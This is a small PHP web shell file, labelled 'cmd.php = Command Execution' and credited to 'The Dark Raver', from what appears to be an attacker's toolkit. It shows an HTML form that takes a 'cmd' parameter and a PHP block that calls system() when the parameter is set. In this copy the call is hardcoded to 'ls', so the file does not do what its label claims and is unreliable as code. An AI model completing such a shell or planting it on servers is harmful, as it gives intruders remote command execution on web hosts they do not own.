<?
//
// PHP_KIT
//
// cmd.php = Command Execution
//
// by: The Dark Raver
// modified: 21/01/2004
//
?>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?
if($_GET['cmd']) {
  system("ls");
  }
?>
</pre>
</BODY></HTML>


